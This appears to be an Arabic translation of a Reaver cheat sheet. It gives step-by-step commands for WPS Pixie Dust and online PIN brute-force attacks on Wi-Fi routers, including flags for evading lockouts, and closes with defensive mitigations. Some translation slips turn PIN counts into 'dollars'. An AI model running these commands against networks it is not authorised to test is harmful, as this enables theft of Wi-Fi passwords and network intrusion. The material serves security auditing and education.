<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ورقة الغش ريفر

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) هي أداة متخصصة لتدقيق أمان Wi-Fi مصممة لتنفيذ هجمات القوة الغاشمة ضد أرقام التعريف الشخصية لمسجل إعداد Wi-Fi المحمي (WPS). من خلال استرداد رمز WPS PIN المكون من 8 أرقام، يسترد Reaver مفتاح WPA/WPA2 المشترك مسبقًا (PSK) ذي النص العادي. كما أنه يدعم هجمات Pixie Dust دون الاتصال بالإنترنت عبر `pixiewps`.

---

## جدول المحتويات

- [آليات ثغرات WPS](#wps-vulnerability-mechanics)
- [التثبيت (`reaver` و`pixiewps`)](#installation-reaver--pixiewps)
- [الاستطلاع: تحديد شبكات WPS (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [هجوم غبار الجني (الاسترداد الفوري للمفتاح)](#pixie-dust-attack-instant-key-recovery)
- [القوة الغاشمة لرمز PIN عبر الإنترنت الكامل](#full-online-wps-pin-brute-force)
- [تحديد معدل AP ومعالجة القفل](#AP-rate-limiting--lockout-handling)
- [التخفيف الدفاعي](#التخفيف الدفاعي)

---

## آليات ثغرات WPS

تستخدم مصادقة WPS PIN رقم PIN مكونًا من 8 أرقام مقسمًا إلى نصفين:
- النصف الأول مكون من 4 أرقام (10^4 = احتمالات 10,000 دولار).
- النصف الثاني مكون من 3 أرقام + رقم واحد في المجموع الاختباري (10^3 = احتمالات 1000 دولار).
- بدلاً من اختبار $10^8 = 100,000,000$، يختبر المهاجم فقط 10,000 $ + 1,000 = 11,000$ من المحاولات على الأكثر.
- **Pixie Dust Attack:** يستغل ضعف PRNG (مولدات الأرقام العشوائية الزائفة) في شرائح لاسلكية محددة (Ralink وMediaTek وRealtek وBroadcom) لحساب رقم التعريف الشخصي لـ WPS دون الاتصال بالإنترنت في ثوانٍ من حزمتين أوليتين فقط.

---

## التثبيت (`reaver` و`pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## الاستطلاع: تحديد شبكات WPS (`wash`)

قبل تشغيل Reaver، ابحث عن نقاط الوصول مع تمكين WPS وتحقق مما إذا كانت مقفلة:
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
الأعمدة الرئيسية التي يجب مراعاتها:
- **`WPS Locked`**: إذا كان `Yes`، فهذا يعني أن جهاز التوجيه قد قام بتأمين محاولات WPS PIN بسبب نشاط القوة الغاشمة السابق. تظهر أجهزة التوجيه المستهدفة `No`.
- **`WPS Ver`**: إصدار WPS (1.0 أو 2.0).
- **`ESSID` & `BSSID`**: اسم الشبكة المستهدفة وMAC.

---

## هجوم غبار الجني (الاسترداد الفوري للمفتاح)

يعد هجوم Pixie Dust (`-K 1`) أسرع هجوم ضد WPS. فهو يجمع E-Hash1 وE-Hash2 وnonces من جهاز التوجيه ويكسر رمز PIN دون الاتصال بالإنترنت دون تفعيل حدود المعدل:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: واجهة وضع المراقبة.
- `-b <bssid>`: جهاز التوجيه المستهدف MAC.
- `-c 6`: قناة نقطة الوصول المستهدفة.
- `-K 1`: قم بتشغيل هجوم Pixie Dust التلقائي عبر `pixiewps`.
- `-vv`: إخراج مطول.

*في حالة وجود ثغرات أمنية، تتم طباعة رمز PIN وWPA PSK في أقل من 10 ثوانٍ.*

---

## القوة الغاشمة لرمز PIN WPS عبر الإنترنت

إذا فشل Pixie Dust، فارجع إلى القوة الغاشمة عبر الإنترنت:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
بمجرد اكتشاف رقم التعريف الشخصي، يقوم Reaver بإخراج ما يلي:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## تحديد معدل AP والتعامل مع القفل

تقوم العديد من أجهزة التوجيه الحديثة بقفل محاولات WPS لمدة تتراوح بين 5 و15 دقيقة بعد 3-5 محاولات فاشلة. استخدم التأخير وأعد محاولة ضبط العلامات:
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### البديل: استخدام `bully`
`bully` هو تطبيق C سريع لهجوم WPS الذي يتعامل بشكل جيد مع تطبيقات جهاز التوجيه الفردية:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## التخفيف الدفاعي

- **تعطيل WPS بالكامل:** التوصية الأكثر أمانًا هي إيقاف تشغيل WPS في واجهة الويب الخاصة بجهاز التوجيه.
- **تحديث البرامج الثابتة:** تطبق أجهزة التوجيه الحديثة قيودًا صارمة على المعدل، والتراجع الأسي، وإصلاح عيوب إنتروبيا PRNG التي يستغلها Pixie Dust.
- **استخدم WPA3:** يقوم WPA3 بإزالة WPS القديم المستند إلى PIN تمامًا، واستبداله بـ Wi-Fi Easy Connect (DPP) الآمن.